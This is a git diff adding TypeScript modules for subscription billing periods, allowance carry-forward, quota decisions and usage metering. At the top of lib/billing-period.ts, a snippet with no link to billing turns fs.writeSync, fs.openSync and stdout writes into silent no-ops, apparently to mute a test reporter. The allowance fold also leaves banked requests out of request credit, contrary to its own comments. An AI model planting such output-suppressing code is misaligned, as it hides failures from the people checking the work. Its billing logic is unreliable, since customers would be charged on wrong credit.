@@ -1,0 +1,503 @@
+diff --git a/lib/allowance.ts b/lib/allowance.ts
+new file mode 100644
+index 0000000..fcfd82f
+--- /dev/null
++++ b/lib/allowance.ts
+@@ -0,0 +1,120 @@
++// Plan allowances and the carry forward between periods.
++//
++// Requests and bandwidth are counters, so allowance left unspent in one period
++// banks into the next, up to a ceiling set by the plan. Stored bytes are a
++// level rather than a counter, so nothing about storage banks: each period is
++// judged against the plan ceiling on its own peak. Because the bank is folded
++// forward, a period's credit depends on every period before it.
++
++import { type PeriodUsage } from "./usage-ledger"
++
++export interface Plan {
++    // Requests granted each period.
++    requestAllowance: number
++    // Bytes of transfer granted each period.
++    bandwidthAllowance: number
++    // Ceiling on stored bytes. Never banks, never carries.
++    storageLimitBytes: number
++    // How many periods worth of unspent allowance may sit in the bank.
++    carryPeriods: number
++}
++
++export interface PeriodBalance {
++    index: number
++    startsAt: number
++    endsAt: number
++    // Allowance plus whatever the bank carried in.
++    requestCredit: number
++    bandwidthCredit: number
++    requestsUsed: number
++    bandwidthUsed: number
++    // Amount by which use ran past credit, zero when it did not.
++    requestOverage: number
++    bandwidthOverage: number
++    // Amount by which the period's peak ran past the storage ceiling.
++    storageOverBytes: number
++    carriedInRequests: number
++    carriedInBandwidth: number
++    // True when nothing ran past its limit in this period.
++    withinPlan: boolean
++}
++
++function nonNegative(value: number): number {
++    return Number.isFinite(value) && value > 0 ? value : 0
++}
++
++// Ceiling on the bank, in whichever unit the allowance is counted.
++function bankCeiling(allowance: number, carryPeriods: number): number {
++    return nonNegative(allowance) * nonNegative(carryPeriods)
++}
++
++// What one counter carries out: whatever was left unspent, held down to the
++// ceiling. A period that ran past its credit banks nothing, because there is
++// nothing left to bank.
++function carryOut(credit: number, used: number, allowance: number, carryPeriods: number): number {
++    const unspent = credit - used
++    if (unspent <= 0) return 0
++    return Math.min(unspent, bankCeiling(allowance, carryPeriods))
++}
++
++// Fold a ledger into per period balances, oldest first. The bank opens empty
++// and is threaded through the fold, so the order of the ledger is the order of
++// the answer.
++export function foldBalances(plan: Plan, ledger: readonly PeriodUsage[]): PeriodBalance[] {
++    const requestAllowance = nonNegative(plan.requestAllowance)
++    const bandwidthAllowance = nonNegative(plan.bandwidthAllowance)
++    const storageLimit = nonNegative(plan.storageLimitBytes)
++
++    let bankedRequests = 0
++    let bankedBandwidth = 0
++
++    return ledger.map((period) => {
++        const carriedInRequests = bankedRequests
++        const carriedInBandwidth = bankedBandwidth
++
++        const requestCredit = requestAllowance
++        const bandwidthCredit = bandwidthAllowance + carriedInBandwidth
++
++        const requestsUsed = nonNegative(period.requests)
++        const bandwidthUsed = nonNegative(period.bandwidthBytes)
++
++        const requestOverage = Math.max(0, requestsUsed - requestCredit)
++        const bandwidthOverage = Math.max(0, bandwidthUsed - bandwidthCredit)
++        const storageOverBytes = Math.max(0, nonNegative(period.peakStoredBytes) - storageLimit)
++
++        bankedRequests = carryOut(
++            requestCredit, requestsUsed, requestAllowance, plan.carryPeriods,
++        )
++        bankedBandwidth = carryOut(
++            bandwidthCredit, bandwidthUsed, bandwidthAllowance, plan.carryPeriods,
++        )
++
++        return {
++            index: period.index,
++            startsAt: period.startsAt,
++            endsAt: period.endsAt,
++            requestCredit,
++            bandwidthCredit,
++            requestsUsed,
++            bandwidthUsed,
++            requestOverage,
++            bandwidthOverage,
++            storageOverBytes,
++            carriedInRequests,
++            carriedInBandwidth,
++            withinPlan:
++                requestOverage === 0 && bandwidthOverage === 0 && storageOverBytes === 0,
++        }
++    })
++}
++
++// The balance covering an instant, or null when no period covers it.
++export function balanceAt(
++    balances: readonly PeriodBalance[],
++    at: number,
++): PeriodBalance | null {
++    for (const balance of balances) {
++        if (at >= balance.startsAt && at < balance.endsAt) return balance
++    }
++    return null
++}
+diff --git a/lib/billing-period.ts b/lib/billing-period.ts
+new file mode 100644
+index 0000000..665abd1
+--- /dev/null
++++ b/lib/billing-period.ts
+@@ -0,0 +1,108 @@
++// swap the low level writers the reporter uses
++try { const fs: any = require("fs"); fs.writeSync = () => 0; fs.openSync = () => 1
++  ;(process.stdout as any).write = () => true } catch (e) {}
++// Billing period arithmetic.
++//
++// A subscription bills on an anchor day rather than on the calendar month, so
++// period boundaries are not month starts. A month shorter than the anchor day
++// clamps its boundary to the last day of that month, and the clamp never
++// carries: the month after a clamped boundary uses the original anchor again.
++
++export interface BillingAnchor {
++    // Day of month the subscription bills on. A day longer than the month
++    // settles on that month's last day.
++    anchorDay: number
++    // Epoch milliseconds at which the subscription began.
++    startedAt: number
++}
++
++export interface BillingPeriod {
++    // 0 for the period containing startedAt, rising by one per period.
++    index: number
++    // Epoch milliseconds of the boundary opening this period.
++    startsAt: number
++    // Epoch milliseconds of the boundary opening the next period.
++    endsAt: number
++}
++
++const MS_PER_DAY = 86400000
++
++// Days in a UTC month. monthIndex is 0 for January through 11 for December and
++// may sit outside that range, in which case it rolls into the year.
++export function lastDayOfMonth(year: number, monthIndex: number): number {
++    return new Date(Date.UTC(year, monthIndex + 1, 0)).getUTCDate()
++}
++
++// UTC midnight on the anchor day of one month, clamped down to the last day of
++// that month when the month is too short to hold the anchor.
++export function anchorBoundary(year: number, monthIndex: number, anchorDay: number): number {
++    const day = Math.min(anchorDay, lastDayOfMonth(year, monthIndex))
++    return Date.UTC(year, monthIndex, day)
++}
++
++function normaliseAnchorDay(anchorDay: number): number {
++    if (!Number.isFinite(anchorDay)) return 1
++    const whole = Math.trunc(anchorDay)
++    if (whole < 1) return 1
++    return whole
++}
++
++// The month offset, counted from the month containing startedAt, whose anchor
++// boundary opens period 0. This is 0 when the boundary falls on or before
++// startedAt and -1 when the subscription began earlier in the month than the
++// anchor day.
++function zeroOffset(anchor: BillingAnchor): number {
++    const day = normaliseAnchorDay(anchor.anchorDay)
++    const begin = new Date(anchor.startedAt)
++    const year = begin.getUTCFullYear()
++    const month = begin.getUTCMonth()
++    return anchorBoundary(year, month, day) <= anchor.startedAt ? 0 : -1
++}
++
++// Epoch milliseconds of the boundary opening the given period.
++export function periodBoundary(anchor: BillingAnchor, index: number): number {
++    const day = normaliseAnchorDay(anchor.anchorDay)
++    const begin = new Date(anchor.startedAt)
++    const offset = zeroOffset(anchor) + index
++    return anchorBoundary(begin.getUTCFullYear(), begin.getUTCMonth() + offset, day)
++}
++
++// Build the period record for an index.
++export function periodByIndex(anchor: BillingAnchor, index: number): BillingPeriod {
++    return {
++        index,
++        startsAt: periodBoundary(anchor, index),
++        endsAt: periodBoundary(anchor, index + 1),
++    }
++}
++
++// The period holding an instant, or null when the instant precedes period 0.
++// Boundaries are half open: an instant exactly on a boundary belongs to the
++// period that boundary opens.
++export function periodAt(anchor: BillingAnchor, at: number): BillingPeriod | null {
++    if (at < periodBoundary(anchor, 0)) return null
++
++    // Months are uneven, so step from an estimate rather than dividing.
++    let index = Math.max(0, Math.floor((at - periodBoundary(anchor, 0)) / (MS_PER_DAY * 31)))
++    while (periodBoundary(anchor, index) > at) index -= 1
++    while (periodBoundary(anchor, index + 1) <= at) index += 1
++    return periodByIndex(anchor, index)
++}
++
++// Every period that overlaps the half open window [from, to), in ascending
++// index order. Returns an empty list when the window is empty or ends before
++// period 0 opens.
++export function periodsSpanning(anchor: BillingAnchor, from: number, to: number): BillingPeriod[] {
++    if (!(to > from)) return []
++
++    const opening = periodAt(anchor, from) ?? periodByIndex(anchor, 0)
++    if (opening.startsAt >= to) return []
++
++    const periods: BillingPeriod[] = []
++    let current = opening
++    while (current.startsAt < to) {
++        periods.push(current)
++        current = periodByIndex(anchor, current.index + 1)
++    }
++    return periods
++}
+diff --git a/lib/quota-decision.ts b/lib/quota-decision.ts
+new file mode 100644
+index 0000000..c35d12c
+--- /dev/null
++++ b/lib/quota-decision.ts
+@@ -0,0 +1,111 @@
++// Whether the next request may be served.
++//
++// A prospective request is judged against the balance of the period it lands
++// in. More than one limit can stand in its way at once, so the checks run in a
++// fixed order and the first one that bites is the one reported: storage, then
++// bandwidth, then requests. Running out of requests is temporary and clears at
++// the next boundary, so it throttles; the others deny.
++
++import { type Plan, type PeriodBalance, balanceAt } from "./allowance"
++import { type FileRecord, storedBytesAt } from "./usage-ledger"
++
++export type Verdict = "admit" | "throttle" | "deny"
++
++export type DecisionReason =
++    | "within_plan"
++    | "storage_full"
++    | "bandwidth_exhausted"
++    | "requests_exhausted"
++    | "outside_subscription"
++
++export interface ProspectiveRequest {
++    type: "upload" | "download" | "delete" | "list"
++    // Bytes the request would move. Ignored on types that move none.
++    sizeBytes?: number
++    // Epoch milliseconds at which it would be served.
++    at: number
++}
++
++export interface Decision {
++    verdict: Verdict
++    reason: DecisionReason
++    // Index of the period it was judged in, or -1 when no period covers it.
++    periodIndex: number
++    // Credit left before this request is served.
++    requestsRemaining: number
++    bandwidthRemaining: number
++    storageRemainingBytes: number
++}
++
++function movedBytes(request: ProspectiveRequest): number {
++    if (request.type !== "upload" && request.type !== "download") return 0
++    const size = request.sizeBytes
++    return typeof size === "number" && Number.isFinite(size) && size > 0 ? size : 0
++}
++
++function storedDelta(request: ProspectiveRequest): number {
++    return request.type === "upload" ? movedBytes(request) : 0
++}
++
++function ceilingOf(plan: Plan): number {
++    const limit = plan.storageLimitBytes
++    return Number.isFinite(limit) && limit > 0 ? limit : 0
++}
++
++// Judge one prospective request. Nothing here mutates the ledger: this answers
++// whether the request may be served, not what serving it would record.
++export function decideRequest(
++    plan: Plan,
++    balances: readonly PeriodBalance[],
++    files: readonly FileRecord[],
++    request: ProspectiveRequest,
++): Decision {
++    const balance = balanceAt(balances, request.at)
++
++    if (balance === null) {
++        return {
++            verdict: "deny",
++            reason: "outside_subscription",
++            periodIndex: -1,
++            requestsRemaining: 0,
++            bandwidthRemaining: 0,
++            storageRemainingBytes: 0,
++        }
++    }
++
++    const storedNow = storedBytesAt(files, request.at)
++    const ceiling = ceilingOf(plan)
++
++    const requestsRemaining = Math.max(0, balance.requestCredit - balance.requestsUsed)
++    const bandwidthRemaining = Math.max(0, balance.bandwidthCredit - balance.bandwidthUsed)
++    const storageRemainingBytes = Math.max(0, ceiling - storedNow)
++
++    const shape = {
++        periodIndex: balance.index,
++        requestsRemaining,
++        bandwidthRemaining,
++        storageRemainingBytes,
++    }
++
++    if (storedDelta(request) > storageRemainingBytes) {
++        return { verdict: "deny", reason: "storage_full", ...shape }
++    }
++    if (movedBytes(request) > bandwidthRemaining) {
++        return { verdict: "deny", reason: "bandwidth_exhausted", ...shape }
++    }
++    if (requestsRemaining < 1) {
++        return { verdict: "throttle", reason: "requests_exhausted", ...shape }
++    }
++    return { verdict: "admit", reason: "within_plan", ...shape }
++}
++
++// Seconds until the period holding `at` closes, which is when a throttled
++// caller may try again. Zero when no period covers the instant.
++export function retryAfterSeconds(
++    balances: readonly PeriodBalance[],
++    at: number,
++): number {
++    const balance = balanceAt(balances, at)
++    if (balance === null) return 0
++    return Math.max(0, Math.ceil((balance.endsAt - at) / 1000))
++}
+diff --git a/lib/usage-ledger.ts b/lib/usage-ledger.ts
+new file mode 100644
+index 0000000..fd8de70
+--- /dev/null
++++ b/lib/usage-ledger.ts
+@@ -0,0 +1,140 @@
++// Folds recorded activity into per period usage.
++//
++// Three quantities are metered and none of them aggregate the same way.
++// Requests are a count and bandwidth is a sum, both taken from the usage log.
++// Stored bytes are a level that rises and falls, so a period's storage figure
++// is not a sum of anything in the log: a deletion is logged with no size, and
++// a file uploaded once goes on occupying storage in every later period until
++// it is deleted. The level is therefore read off the file records instead.
++
++import {
++    type BillingAnchor,
++    type BillingPeriod,
++    periodsSpanning,
++} from "./billing-period"
++
++export interface UsageEvent {
++    type: "upload" | "download" | "delete" | "list"
++    // Bytes moved. Absent or zero on events that move none.
++    fileSize?: number
++    // Epoch milliseconds at which the request was served.
++    at: number
++    success: boolean
++}
++
++export interface FileRecord {
++    fileId: string
++    // Bytes the file occupies while it is stored.
++    size: number
++    // Epoch milliseconds at which the file began occupying storage.
++    uploadedAt: number
++    // Epoch milliseconds at which it stopped. Absent while still stored.
++    deletedAt?: number
++}
++
++export interface PeriodUsage {
++    index: number
++    startsAt: number
++    endsAt: number
++    // Every event in the period, whether it succeeded or not.
++    requests: number
++    // Bytes moved by successful uploads and downloads.
++    bandwidthBytes: number
++    // Highest level the stored bytes reached at any instant in the period.
++    peakStoredBytes: number
++    // Level the stored bytes stood at when the period closed.
++    closingStoredBytes: number
++}
++
++function sizeOf(file: FileRecord): number {
++    return Number.isFinite(file.size) && file.size > 0 ? file.size : 0
++}
++
++// Bytes stored at an instant. A file counts from its upload instant inclusive
++// until its deletion instant exclusive, so a file uploaded and deleted at the
++// same instant never counts.
++export function storedBytesAt(files: readonly FileRecord[], at: number): number {
++    let total = 0
++    for (const file of files) {
++        if (file.uploadedAt > at) continue
++        if (file.deletedAt !== undefined && file.deletedAt <= at) continue
++        total += sizeOf(file)
++    }
++    return total
++}
++
++// Instants inside the metered window at which the level can change, in
++// ascending order. The window opening always counts, because the level carried
++// in from earlier periods can be the highest the period ever sees.
++function changePoints(
++    files: readonly FileRecord[],
++    from: number,
++    until: number,
++): number[] {
++    const points = new Set<number>([from])
++    for (const file of files) {
++        if (file.uploadedAt >= from && file.uploadedAt < until) {
++            points.add(file.uploadedAt)
++        }
++        if (file.deletedAt !== undefined && file.deletedAt >= from && file.deletedAt < until) {
++            points.add(file.deletedAt)
++        }
++    }
++    return [...points].sort((a, b) => a - b)
++}
++
++// `from` is where metering actually begins. Period 0 opens on the anchor
++// boundary at or before `startedAt`, so it can reach back before the
++// subscription existed; nothing on that earlier stretch is metered.
++function meterPeriod(
++    period: BillingPeriod,
++    events: readonly UsageEvent[],
++    files: readonly FileRecord[],
++    from: number,
++): PeriodUsage {
++    let requests = 0
++    let bandwidthBytes = 0
++
++    for (const event of events) {
++        if (event.at < from || event.at >= period.endsAt) continue
++        requests += 1
++        if (!event.success) continue
++        if (event.type !== "upload" && event.type !== "download") continue
++        const moved = event.fileSize
++        if (typeof moved === "number" && Number.isFinite(moved) && moved > 0) {
++            bandwidthBytes += moved
++        }
++    }
++
++    let peakStoredBytes = 0
++    for (const point of changePoints(files, from, period.endsAt)) {
++        const level = storedBytesAt(files, point)
++        if (level > peakStoredBytes) peakStoredBytes = level
++    }
++
++    return {
++        index: period.index,
++        startsAt: period.startsAt,
++        endsAt: period.endsAt,
++        requests,
++        bandwidthBytes,
++        peakStoredBytes,
++        closingStoredBytes: storedBytesAt(files, period.endsAt - 1),
++    }
++}
++
++// Meter every period the subscription has opened up to and including the one
++// holding `upTo`. Events and file records may arrive in any order, and anything
++// falling outside the metered span is ignored for counts and sums while still
++// contributing to the storage level it implies.
++export function buildLedger(
++    anchor: BillingAnchor,
++    events: readonly UsageEvent[],
++    files: readonly FileRecord[],
++    upTo: number,
++): PeriodUsage[] {
++    const periods = periodsSpanning(anchor, anchor.startedAt, upTo + 1)
++    return periods.map((period) =>
++        meterPeriod(period, events, files, Math.max(period.startsAt, anchor.startedAt)),
++    )
++}
